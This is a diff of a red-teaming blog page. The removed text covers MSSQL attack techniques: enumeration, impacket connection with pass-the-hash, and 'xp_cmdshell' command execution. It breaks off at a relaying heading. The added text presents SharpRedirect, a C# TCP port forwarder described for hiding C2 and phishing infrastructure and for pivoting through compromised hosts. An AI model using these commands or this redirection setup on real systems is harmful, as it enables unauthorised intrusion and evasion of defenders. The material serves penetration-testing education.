@@ -10,24 +10,24 @@
     <meta name="generator" content="Retype 3.6.0">
 
     <!-- Primary Meta Tags -->
-    <title>Compromising MSSQL Databases by Relaying</title>
-    <meta name="title" content="Compromising MSSQL Databases by Relaying">
-    <meta name="description" content="Database security must be guaranteed in the connected digital world of today.">
+    <title>Redirecting Traffic From Windows via SharpRedirect</title>
+    <meta name="title" content="Redirecting Traffic From Windows via SharpRedirect">
+    <meta name="description" content="As penetration testers, we constantly find ourselves battling for discretion and efficiency in our operations.">
 
     <!-- Canonical -->
-    <link rel="canonical" href="https://lsecqt.github.io/Red-Teaming-Army/active-directory/compromising-mssql-databases-by-relaying/">
+    <link rel="canonical" href="https://lsecqt.github.io/Red-Teaming-Army/networking/redirecting-traffic-from-windows-via-sharpredirect/">
 
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="https://lsecqt.github.io/Red-Teaming-Army/active-directory/compromising-mssql-databases-by-relaying/">
-    <meta property="og:title" content="Compromising MSSQL Databases by Relaying">
-    <meta property="og:description" content="Database security must be guaranteed in the connected digital world of today.">
+    <meta property="og:url" content="https://lsecqt.github.io/Red-Teaming-Army/networking/redirecting-traffic-from-windows-via-sharpredirect/">
+    <meta property="og:title" content="Redirecting Traffic From Windows via SharpRedirect">
+    <meta property="og:description" content="As penetration testers, we constantly find ourselves battling for discretion and efficiency in our operations.">
 
     <!-- Twitter -->
     <meta property="twitter:card" content="summary_large_image">
-    <meta property="twitter:url" content="https://lsecqt.github.io/Red-Teaming-Army/active-directory/compromising-mssql-databases-by-relaying/">
-    <meta property="twitter:title" content="Compromising MSSQL Databases by Relaying">
-    <meta property="twitter:description" content="Database security must be guaranteed in the connected digital world of today.">
+    <meta property="twitter:url" content="https://lsecqt.github.io/Red-Teaming-Army/networking/redirecting-traffic-from-windows-via-sharpredirect/">
+    <meta property="twitter:title" content="Redirecting Traffic From Windows via SharpRedirect">
+    <meta property="twitter:description" content="As penetration testers, we constantly find ourselves battling for discretion and efficiency in our operations.">
 
     <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>
 
@@ -37,6 +37,7 @@
     <script data-cfasync="false" src="../../resources/js/config.js?v=3.6.0.788180626879" data-turbo-eval="false" defer></script>
     <script data-cfasync="false" src="../../resources/js/retype.js?v=3.6.0" data-turbo-eval="false" defer></script>
     <script id="lunr-js" data-cfasync="false" src="../../resources/js/lunr.js?v=3.6.0.788180626879" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../resources/js/prism.js?v=3.6.0.788180626879" defer></script>
 </head>
 <body>
     <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
@@ -319,253 +320,235 @@
                                 <!-- Rendered if sidebar right is enabled -->
                                 <div id="docs-sidebar-right-toggle"></div>
                                 <!-- Page content  -->
-<doc-anchor-target id="compromising-mssql-databases-by-relaying" class="break-words">
+<doc-anchor-target id="redirecting-traffic-from-windows-via-sharpredirect" class="break-words">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#compromising-mssql-databases-by-relaying">#</doc-anchor-trigger>
-        <span>Compromising MSSQL Databases by Relaying</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#redirecting-traffic-from-windows-via-sharpredirect">#</doc-anchor-trigger>
+        <span>Redirecting Traffic From Windows via SharpRedirect</span>
     </h1>
 </doc-anchor-target>
-<doc-anchor-target id="introduction">
+<p><figure class="content-center">
+    <img src="sharpredirect.webp" alt="">
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<doc-anchor-target id="intro">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#introduction">#</doc-anchor-trigger>
-        <span>Introduction</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#intro">#</doc-anchor-trigger>
+        <span>Intro</span>
     </h2>
 </doc-anchor-target>
-<p>Database security must be guaranteed in the connected digital world of today. Many firms choose Microsoft SQL Server (MSSQL) because of its strong feature set and integration capabilities. But enhanced functionality also means a larger surface area for attacks, which makes it a desirable target for (ethical) hackers. Even though there are multiple attacks targeting MSSQL databases, relaying is one of the most effective ones. They are indeed a particularly sneaky way to compromise MSSQL servers.</p>
-<p>We&#x27;ll explore the nuances of relaying attacks on MSSQL servers in this blog post. We&#x27;ll investigate the workings of these attacks, and show how they might affect the systems they are aimed against. We&#x27;ll also touch on the defensive side of the things with some remediation ideas.</p>
-<p>I have already made a video about this topic, so if you prefer watching instead of reading, feel welcomed and if you enjoy my work, feel free to subscribe:</p>
+<p>As penetration testers, we constantly find ourselves battling for discretion and efficiency in our operations. The ability to mask infrastructure or move through networks seamlessly is a necessity. Enter <strong>SharpRedirect</strong>, a C# tool I’ve developed to simplify redirection in a way that’s both practical and powerful. In this blog post, we’ll dive into the utility of traffic redirection during penetration testing and red teaming operations, and I’ll provide a detailed analysis of SharpRedirect to help you understand why and when it might be useful.</p>
+<p>If you enjoy watching a video instead of reading, feel welcomed to my channel where I already posted a video about SharpRedirect:</p>
 <p>
 <figure>
     <div class="relative w-full mb-6 overflow-hidden pt-9/16">
-        <iframe class="w-full h-full border-0 absolute inset-0" src="https://www.youtube.com/embed/o5DR_rW8_VQ" allowfullscreen></iframe>
+        <iframe class="w-full h-full border-0 absolute inset-0" src="https://www.youtube.com/embed/Uvu5JSz-14Q" allowfullscreen></iframe>
     </div>
 </figure>
 </p>
-<p>Additionally, if you have further appreciation to my work, don&#x27;t hesitate to become my <a href="https://www.patreon.com/Lsecqt">Patreon</a>. By doing so, you support my work while accessing custom maldev tools that I am sure you can find handy.</p>
-<doc-anchor-target id="what-is-mssql">
+<p>Do not forget to join the Red Teaming Army&#x27;s Discord server where we share knowledge, experience, and debug together in real time: <a href="https://discord.gg/bgSpdheEgu">https://discord.gg/bgSpdheEgu</a></p>
+<doc-anchor-target id="why-redirection">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#what-is-mssql">#</doc-anchor-trigger>
-        <span>What is MSSQL?</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#why-redirection">#</doc-anchor-trigger>
+        <span>Why Redirection?</span>
     </h2>
 </doc-anchor-target>
-<p>MSSQL, or Microsoft SQL Server, is a relational database management system (RDBMS) developed by Microsoft. It is designed to store and manage large amounts of data efficiently. MSSQL uses Structured Query Language (SQL), which is the standard language for managing and manipulating databases.</p>
-<p>Think of MSSQL as a sophisticated filing system that not only keeps your data safe but also allows you to quickly retrieve and manipulate this data through queries. This database management system supports a variety of data types, including integers, text, and even more complex data structures like XML and JSON.</p>
-<p>One of the primary reasons for the adoption of MSSQL by companies is its robust performance and reliability. MSSQL is designed to handle large volumes of data efficiently, making it an ideal choice for enterprises that require high-performance databases to manage their critical applications and services.</p>
-<p>The integration of MSSQL with Active Directory (AD) provides a seamless and secure authentication mechanism, which is crucial for maintaining the integrity and security of data. By leveraging AD, companies can manage user access and permissions centrally, ensuring that only authorized personnel have access to sensitive information. This integration simplifies user management and enhances security by using existing AD credentials, reducing the need for multiple login credentials and streamlining the authentication process.</p>
+<p>Redirection plays a pivotal role in obfuscating the true origin of your infrastructure. Whether you’re conducting a phishing campaign, running a command and control (C2) server, or simply need to maintain persistence in a network, redirectors can be quite handy. By routing traffic through intermediary points, you add layers to your infrastructure, complicating detection efforts for defenders. Redirection also aids in bypassing firewalls or network restrictions by using trusted intermediary systems to forward traffic to its intended destination. One such example is to host your redirector on Azure infrastructure.</p>
+<p>In scenarios where operational security (OPSEC) is critical, redirection tools help disguise your infrastructure. They give you the flexibility to relocate services dynamically, ensuring your actual backend remains hidden while still serving requests.</p>
+<p>Essentially, the redirection process can be visualized works like that:</p>
 <p><figure class="content-center">
-    <img src="mssql_chart.jpg" alt="MSSQL Chart">
-    <figcaption class="caption">MSSQL Chart</figcaption>
+    <img src="graph.png" alt="Redirection graph">
+    <figcaption class="caption">Redirection graph</figcaption>
 </figure>
 </p>
-<doc-anchor-target id="why-mssql-databases-are-nice-targets">
+<doc-anchor-target id="external-redirections-vs-internal-redirections">
     <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#why-mssql-databases-are-nice-targets">#</doc-anchor-trigger>
-        <span>Why MSSQL Databases are nice targets?</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#external-redirections-vs-internal-redirections">#</doc-anchor-trigger>
+        <span>External Redirections vs Internal Redirections</span>
     </h2>
 </doc-anchor-target>
-<p>From an attacker&#x27;s perspective, MSSQL databases are extremely good targets, mainly because of:</p>
+<p>As penetration testers, understanding and leveraging redirection techniques is vital for stealth and access management. Let’s break down the difference between <strong>external redirections</strong> and <strong>internal redirections</strong>, emphasizing their practical use cases in offensive operations.</p>
+<doc-anchor-target id="external-redirections">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#external-redirections">#</doc-anchor-trigger>
+        <span>External Redirections</span>
+    </h3>
+</doc-anchor-target>
+<p>External redirections are primarily used to <strong>obfuscate the true infrastructure</strong> during phishing campaigns or while handling Command and Control (C2) traffic. They rely on redirector servers, often hosted in the cloud or on dedicated virtual machines, that sit between the target and the actual malicious infrastructure. This adds a layer of anonymity and resilience by masking the origin of traffic, making attribution harder for defenders. For example:</p>
+<ul>
+<li>A phishing email directs users to a domain that appears legitimate but redirects traffic to the attacker’s C2 infrastructure.</li>
+<li>C2 beacons route through an external redirector, obscuring the backend server’s real IP address and making takedown efforts challenging.</li>
+</ul>
+<p>In short, external redirections act as a <strong>traffic shield</strong>, protecting your infrastructure while maintaining operational flexibility.</p>
+<p><figure class="content-center">
+    <img src="external_redirector_graph.png" alt="External Redirection example">
+    <figcaption class="caption">External Redirection example</figcaption>
+</figure>
+</p>
+<doc-anchor-target id="internal-redirections">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#internal-redirections">#</doc-anchor-trigger>
+        <span>Internal Redirections</span>
+    </h3>
+</doc-anchor-target>
+<p>Internal redirections address a different challenge: <strong>enabling access to machines within protected networks</strong> that lack outbound internet connectivity. These redirections leverage compromised machines inside the target network to act as intermediaries. Traffic from isolated systems is forwarded through an internal pivot host, which then connects to the C2 infrastructure. Practical scenarios include:</p>
+<ul>
+<li>A machine in a restricted subnet that cannot directly communicate externally routes its traffic through a compromised host with internet access.</li>
+<li>Internal redirection bridges the gap between segmented or air-gapped environments and your external C2 framework.</li>
+</ul>
+<p>In essence, internal redirections are a <strong>bridge for constrained environments</strong>, enabling continuous access and exfiltration despite strict network policies.</p>
+<p>Mastering both external and internal redirection techniques ensures operational success while minimizing exposure and maximizing persistence in hostile or monitored environments.</p>
+<p><figure class="content-center">
+    <img src="internal_redirector_graph.png" alt="Internal Redirection example">
+    <figcaption class="caption">Internal Redirection example</figcaption>
+</figure>
+</p>
+<p>This diagram demonstrates a network scenario where <strong>outbound traffic restrictions</strong> (red arrows) and <strong>permitted outbound paths</strong> (green arrows) dictate the flow of data within a protected environment.</p>
+<p>The red arrows represent <strong>blocked outbound traffic</strong>, indicating that some machines in the network are restricted from directly connecting to external servers (e.g., the Command and Control (C2) infrastructure). This is typical in high-security environments to prevent unauthorized data exfiltration or malicious communications</p>
+<p>The green arrows illustrate <strong>permitted network paths</strong> where outbound traffic is allowed. In this case:</p>
+<ul>
+<li><strong>Victim 2</strong> acts as a <strong>pivot point</strong> since it has permission to connect externally to the C2 server.</li>
+<li>Both <strong>Victim 1</strong> and <strong>Victim 3</strong> can route their traffic through Victim 2 using internal redirection techniques, enabling them to bypass their outbound restrictions and establish communication with the C2 server.</li>
+</ul>
+<p>This is what SharpRedirect is designed for. Most of the redirectors I used before were Linux based and thus, it might be a little challenging to do internal redirections as mentioned above. This created the idea for SharpRedirect and here we are.</p>
+<doc-anchor-target id="introducing-sharpredirect">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#introducing-sharpredirect">#</doc-anchor-trigger>
+        <span>Introducing SharpRedirect</span>
+    </h2>
+</doc-anchor-target>
+<p>SharpRedirect is a lightweight, easy-to-use C# tool designed for seamless traffic redirection. The tool redirects TCP traffic from a local port to a specified remote host and port. It’s built for penetration testers and red teamers who need a reliable solution to hide infrastructure or reach networks more effectively.</p>
+<doc-anchor-target id="technical-overview-of-sharpredirect">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#technical-overview-of-sharpredirect">#</doc-anchor-trigger>
+        <span>Technical Overview of SharpRedirect</span>
+    </h3>
+</doc-anchor-target>
+<p>Let’s break down the source code to understand how SharpRedirect operates and why it’s particularly useful in penetration testing.</p>
 <ol>
-<li>They store sensitive data</li>
-<li>Their stored procedures</li>
-</ol>
-<p>The first option is obvious, it is a database, if we obtain some kind of access to it, we can try to read out the tables into finding credentials or other sensitive data which can help us escalate over the domain.</p>
-<p>The second option is more interesting, even though MSSQL databases are relation-based engines like MySQL and Oracle , they differ a lot.  One of the main difference is their stored procedures.</p>
-<doc-anchor-target id="what-is-a-stored-procedure">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#what-is-a-stored-procedure">#</doc-anchor-trigger>
-        <span>What is a stored procedure</span>
-    </h3>
-</doc-anchor-target>
-<p>Stored procedures in MSSQL databases are precompiled collections of one or more SQL statements that are saved under a name and processed as a unit. They play a critical role in database management and are utilized to perform a variety of tasks, from data manipulation and validation to administrative tasks.</p>
-<p>A stored procedure is written in Transact-SQL (T-SQL), which is Microsoft&#x27;s and Sybase&#x27;s proprietary extension of SQL. When a stored procedure is created, it is compiled and stored in the database catalog.</p>
-<p>Stored procedure can be manually created for ease of work, but there are predefined ones which are super interesting for us.</p>
-<p>In Microsoft SQL Server, stored procedures that start with <code v-pre>xp_</code> are known as extended stored procedures. These procedures are special because they provide an interface between SQL Server and external components or operating system services. Here are some similar stored procedures that start with <code v-pre>xp_</code>, along with brief explanations of their purposes:</p>
-<doc-anchor-target id="1-xp_fixeddrives">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#1-xp_fixeddrives">#</doc-anchor-trigger>
-        <span>1. <code v-pre>xp_fixeddrives</code></span>
-    </h3>
-</doc-anchor-target>
+<li><p><strong>Main Entry Point</strong> The program begins execution in the <code v-pre>Main</code> method. This method is responsible for parsing command-line arguments and validating them. It ensures the user provides exactly three arguments: the local port, the destination host, and the destination port.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-csharp"><code v-pre class="language-csharp">if (args.Length != 3)
+{
+    Console.WriteLine(&quot;Usage: PortRedirector &lt;localPort&gt; &lt;destinationHost&gt; &lt;destinationPort&gt;&quot;);
+    return;
+}</code></pre>
+</doc-codeblock></div>
+<p>The program then validates that the provided ports are valid integers. This step is crucial to prevent runtime errors caused by invalid inputs.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-csharp"><code v-pre class="language-csharp">if (!int.TryParse(args[0], out int localPort) || !int.TryParse(args[2], out int destinationPort))
+{
+    Console.WriteLine(&quot;Error: Ports must be valid integers.&quot;);
+    return;
+}</code></pre>
+</doc-codeblock></div>
+<p>Once validated, the arguments are passed to the <code v-pre>PortRedirector</code> class, which encapsulates the logic for handling traffic redirection.</p>
+</li>
+<li><p><strong>PortRedirector Class</strong> The <code v-pre>PortRedirector</code> class is the heart of the application. It manages the TCP listener that accepts incoming connections and forwards them to the destination.</p>
 <ul>
-<li><strong>Purpose:</strong> Returns information about the disk drives on the server.</li>
-<li><strong>Example:</strong> <code v-pre>EXEC xp_fixeddrives;</code></li>
-</ul>
-<doc-anchor-target id="2-xp_regread-and-xp_regwrite">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#2-xp_regread-and-xp_regwrite">#</doc-anchor-trigger>
-        <span>2. <code v-pre>xp_regread</code> and <code v-pre>xp_regwrite</code></span>
-    </h3>
-</doc-anchor-target>
-<ul>
-<li><strong>Purpose:</strong> Read from and write to the Windows registry from within SQL Server.</li>
-<li><strong>Examples:</strong>
-<ul>
-<li><code v-pre>EXEC xp_regread 'HKEY_LOCAL_MACHINE', 'SOFTWARE\MyApp', 'Version';</code></li>
-<li><code v-pre>EXEC xp_regwrite 'HKEY_LOCAL_MACHINE', 'SOFTWARE\MyApp', 'Version', '1.0';</code></li>
-</ul>
+<li><p><strong>Constructor</strong> The constructor initializes the local port, destination host, and destination port. These values are stored as private fields for use throughout the class.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-csharp"><code v-pre class="language-csharp">public PortRedirector(int localPort, string destinationHost, int destinationPort)
+{
+    _localPort = localPort;
+    _destinationHost = destinationHost;
+    _destinationPort = destinationPort;
+}</code></pre>
+</doc-codeblock></div>
+</li>
+<li><p><strong>Start Method</strong> The <code v-pre>Start</code> method initializes a <code v-pre>TcpListener</code> on the specified local port and begins listening for incoming connections.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-csharp"><code v-pre class="language-csharp">_listener = new TcpListener(IPAddress.Any, _localPort);
+_listener.Start();
+_isRunning = true;</code></pre>
+</doc-codeblock></div>
+<p>The method then spawns a new task to handle incoming connections asynchronously. This design allows the application to accept multiple clients simultaneously without blocking the main thread.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-csharp"><code v-pre class="language-csharp">Task.Run(() =&gt; AcceptClients());</code></pre>
+</doc-codeblock></div>
+</li>
+<li><p><strong>AcceptClients Method</strong> This method runs in a loop, accepting incoming TCP clients as long as the <code v-pre>_isRunning</code> flag is set to <code v-pre>true</code>. When a client connects, the method delegates traffic handling to the <code v-pre>HandleClient</code> method.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-csharp"><code v-pre class="language-csharp">private async Task AcceptClients()
+{
+    while (_isRunning)
+    {
+        try
+        {
+            var client = await _listener.AcceptTcpClientAsync();
+            Console.WriteLine(&quot;Client connected.&quot;);
+            _ = HandleClient(client);
+        }
+        catch (Exception ex)
+        {
+            if (_isRunning)
+                Console.WriteLine($&quot;Error accepting client: {ex.Message}&quot;);
+        }
+    }
+}</code></pre>
+</doc-codeblock></div>
+</li>
+<li><p><strong>HandleClient Method</strong> This method establishes a connection to the destination host and port for each incoming client. Once connected, it forwards traffic in both directions using the <code v-pre>CopyStream</code> method.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-csharp"><code v-pre class="language-csharp">var forwardTask = CopyStream(sourceStream, destinationStream);
+var backwardTask = CopyStream(destinationStream, sourceStream);
+await Task.WhenAll(forwardTask, backwardTask);</code></pre>
+</doc-codeblock></div>
+<p>This bidirectional forwarding ensures that data can flow seamlessly between the source and destination.</p>
 </li>
 </ul>
-<doc-anchor-target id="3-xp_fileexist-and-xp_filesize">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#3-xp_fileexist-and-xp_filesize">#</doc-anchor-trigger>
-        <span>3. <code v-pre>xp_fileexist</code> and <code v-pre>xp_filesize</code></span>
-    </h3>
-</doc-anchor-target>
-<ul>
-<li><strong>Purpose:</strong> Checks if a file exists and returns its size, respectively.</li>
-<li><strong>Examples:</strong>
-<ul>
-<li><code v-pre>EXEC xp_fileexist 'C:\MyFile.txt';</code></li>
-<li><code v-pre>EXEC xp_filesize 'C:\MyFile.txt';</code></li>
-</ul>
 </li>
-</ul>
-<doc-anchor-target id="4-xp_dirtree">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#4-xp_dirtree">#</doc-anchor-trigger>
-        <span>4. <code v-pre>xp_dirtree</code></span>
-    </h3>
-</doc-anchor-target>
-<ul>
-<li><strong>Purpose:</strong> Generates a hierarchical listing of files and directories within a specified directory on the file system</li>
-<li><strong>Example:</strong> <code v-pre>EXEC xp_dirtree 'C:\MyDirectory\', 1;</code></li>
-</ul>
-<doc-anchor-target id="5-xp_cmdshell">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#5-xp_cmdshell">#</doc-anchor-trigger>
-        <span>5. <code v-pre>xp_cmdshell</code></span>
-    </h3>
-</doc-anchor-target>
-<ul>
-<li><strong>Purpose:</strong> Executes operating system commands from within SQL Server.</li>
-<li><strong>Example:</strong> <code v-pre>EXEC xp_cmdshell 'dir C:\';</code></li>
-</ul>
-<p>As you might already start to get it, some of the predefined stored procedures can be abused into offense.</p>
-<doc-anchor-target id="enumerating-mssql-databases">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#enumerating-mssql-databases">#</doc-anchor-trigger>
-        <span>Enumerating MSSQL Databases</span>
-    </h2>
-</doc-anchor-target>
-<p>Before diving into the attacks, let&#x27;s first demonstrate how to obtain a valid list of targets. For this demo we will use the well-known <a href="https://github.com/NetSPI/PowerUpSQL">PowerUpSQL</a>. While this toolkit can be used not only for enumeration, we will not completely depend on it for this blogpost.</p>
-<p>It is a powershell script, after loading it either from import-module or reflectively via iex, we can now utilize its functions. One such function is <code v-pre>Get-SQLInstanceDomain</code> and <code v-pre>Get-SQLInstanceLocal</code>. As their names are speaking, these functions are querying either the Active Directory or the local system for finding database engines.</p>
-<div class="flex mb-6">
-    <div class="shrink-0 w-1 rounded-tl rounded-bl bg-blue-500 dark:bg-blue-400"></div>
-    <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
-        <div class="flex items-center ml-4 h-7">
-            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-blue-500 dark:text-blue-400" width="22" height="22" viewBox="0 0 24 24" role="presentation">
-                <g fill="currentColor"><g>
-                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
-                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
-                    <path fill="none" d="M0 0h24v24H0z"></path>
-                </g></g>
-            </svg>
-        </div>
-        <div class="pr-5 ml-3 w-full">
-<p>PowerUpSQL is designed to enumerate and target only MSSQL servers.</p>
-        </div>
-    </div>
-</div>
-<p><figure class="content-center">
-    <img src="enum.png" alt="Get-SQLInstanceDomain output">
-    <figcaption class="caption"><code v-pre>Get-SQLInstanceDomain</code> output</figcaption>
-</figure>
-If you want to select only the <code v-pre>ComputerName</code> field, you can use the powershell utility <code v-pre>select</code>:
-<code v-pre>Get-SQLInstanceDomain | select ComputerName</code></p>
-<p>Also, it is always advised to run the <code v-pre>Invoke-SQLAudit</code> against the enumerated instances for each user you compromise. You never know when you will hit the jackpot.</p>
-<p>For more <code v-pre>PowerUpSQL</code> functions, you can refer to this <a href="https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet">cheatsheet</a>.</p>
-<doc-anchor-target id="attacking-mssql-databases">
-    <h2>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#attacking-mssql-databases">#</doc-anchor-trigger>
-        <span>Attacking MSSQL Databases</span>
-    </h2>
-</doc-anchor-target>
-<p>For these demos, we will operate from a standpoint of compromised user. We will not cover the user attack itself, but let&#x27;s imagine for a second it was due to password spray attack. The main idea of this blog is to show some of the basic attacks over MSSQL servers, without a valid credentials, what we can do is brute-forcing and credentials snuffing.</p>
-<doc-anchor-target id="attack-1---xp_cmdshell">
-    <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#attack-1---xp_cmdshell">#</doc-anchor-trigger>
-        <span>Attack 1 - XP_CMDSHELL</span>
-    </h3>
-</doc-anchor-target>
-<p>While this attack is simple and well known, I still felt the need to include it here. In order for this attack to work, we would need to have this procedure already enabled on the targeted system, or else, we would need to have sysadmin privileges over it so we can enable it. Here it is important to mention that users that have the sysadmin privileges might be on both the domain and the local level, for instance, the <code v-pre>sa</code> account is the default, main and most privileged account. On top of that, since the MSSQLs can be easily integrated with AD, it is also possible to find domain users who might have the same level of privileges, so think more open here.</p>
-<p>As mentioned, for this scenario we compromised a user which has a sysadmin level privileges over the database. When that&#x27;s the case, it is simply enough to:</p>
-<ol>
-<li>Connect to the database</li>
+<li><p><strong>Stream Copying</strong> The <code v-pre>CopyStream</code> method is a critical component of the redirection logic. It reads data from one stream and writes it to another in chunks, ensuring efficient data transfer.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-csharp"><code v-pre class="language-csharp">private async Task CopyStream(Stream input, Stream output)
+{
+    try
+    {
+        byte[] buffer = new byte[8192];
+        int bytesRead;
+        while ((bytesRead = await input.ReadAsync(buffer, 0, buffer.Length)) &gt; 0)
+        {
+            await output.WriteAsync(buffer, 0, bytesRead);
+        }
+    }
+    catch (Exception ex)
+    {
+        Console.WriteLine($&quot;Error copying stream: {ex.Message}&quot;);
+    }
+}</code></pre>
+</doc-codeblock></div>
+<p>The method uses a buffer to minimize the number of read/write operations, enhancing performance. It also includes error handling to gracefully handle interruptions in the data flow.</p>
+</li>
+<li><p><strong>Stop Method</strong> The <code v-pre>Stop</code> method halts the listener and stops accepting new connections. This method is particularly useful for gracefully shutting down the application.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-csharp"><code v-pre class="language-csharp">public void Stop()
+{
+    _isRunning = false;
+    _listener?.Stop();
+}</code></pre>
+</doc-codeblock></div>
+</li>
 </ol>
-<p>The DB Connection can be done from many different softwares, for example the <a href="https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver16">SSMS</a> is utility from Microsoft, that is capable of full database management and operation. Alternatively, if operating from linux, impacket got us covered. The <code v-pre>impacket-mssqlclient</code> is nice script that is capable of performing <a href="https://www.beyondtrust.com/resources/glossary/pass-the-hash-pth-attack">pass the hash</a> while having all functionalities that we need. So in order to connect:</p>
-<p><code v-pre>impacket-mssqlclient 'DOMAIN/user'@&lt;IP OR FQDN&gt;</code></p>
-<p><figure class="content-center">
-    <img src="connect.png" alt="Connecting to MSSQL instance on 172.16.16.54">
-    <figcaption class="caption">Connecting to MSSQL instance on 172.16.16.54</figcaption>
-</figure>
-</p>
-<div class="flex mb-6">
-    <div class="shrink-0 w-1 rounded-tl rounded-bl bg-blue-500 dark:bg-blue-400"></div>
-    <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
-        <div class="flex items-center ml-4 h-7">
-            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-blue-500 dark:text-blue-400" width="22" height="22" viewBox="0 0 24 24" role="presentation">
-                <g fill="currentColor"><g>
-                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
-                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
-                    <path fill="none" d="M0 0h24v24H0z"></path>
-                </g></g>
-            </svg>
-        </div>
-        <div class="pr-5 ml-3 w-full">
-<p>If connecting to MSSQL instance via domain joined user, make sure to include the <code v-pre>-windows-auth</code> flag. If the flag is missing, the impacket script will tolerate the credentials on local level.</p>
-        </div>
-    </div>
-</div>
-<ol start="2">
-<li>Execute commands</li>
-</ol>
-<p><code v-pre>enable_xp_cmdshell</code></p>
-<p><code v-pre>xp_cmdshell whoami</code></p>
-<p><figure class="content-center">
-    <img src="shell.png" alt="Executing system level commands via xp_cmdshell stored procedure">
-    <figcaption class="caption">Executing system level commands via <code v-pre>xp_cmdshell</code> stored procedure</figcaption>
-</figure>
-</p>
-<p>In this case, the database is running as <code v-pre>nt authority\local service</code>. Always check the user behind the MSSQL process, as you later will find how handy this can be. However, in this case, we are effectively <code v-pre>NT AUTHORITY\SYSTEM</code> since the service accounts has dangerous local privileges which can be abused with for example potato attacks. If you want to learn more about this hit me up in <a href="https://discord.gg/bgSpdheEgu">Discord</a>, so I can blog about this topic.</p>
-<div class="flex mb-6">
-    <div class="shrink-0 w-1 rounded-tl rounded-bl bg-blue-500 dark:bg-blue-400"></div>
-    <div class="flex w-full py-4 border border-l-0 border-gray-300 rounded-tr rounded-br doc-alert bg-white dark:bg-dark-700 dark:border-dark-700" role="alert">
-        <div class="flex items-center ml-4 h-7">
-            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px text-blue-500 dark:text-blue-400" width="22" height="22" viewBox="0 0 24 24" role="presentation">
-                <g fill="currentColor"><g>
-                    <path d="M12 1C5.93 1 1 5.93 1 12s4.93 11 11 11 11-4.93 11-11S18.07 1 12 1zm0 20c-4.96 0-9-4.04-9-9s4.04-9 9-9 9 4.04 9 9-4.04 9-9 9z"></path>
-                    <path d="M12 11c-.55 0-1 .45-1 1v4c0 .55.45 1 1 1s1-.45 1-1v-4c0-.55-.45-1-1-1zM12.01 7c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
-                    <path fill="none" d="M0 0h24v24H0z"></path>
-                </g></g>
-            </svg>
-        </div>
-        <div class="pr-5 ml-3 w-full">
-<p>Sometimes <code v-pre>xp_cmdshell</code> might be explicitly hardened (disabled), in such cases, you may want to try executing commands via the <code v-pre>sp_start_job</code> option from <code v-pre>impacket-mssqlclient</code>.</p>
-        </div>
-    </div>
-</div>
-<doc-anchor-target id="attack-2---relaying">
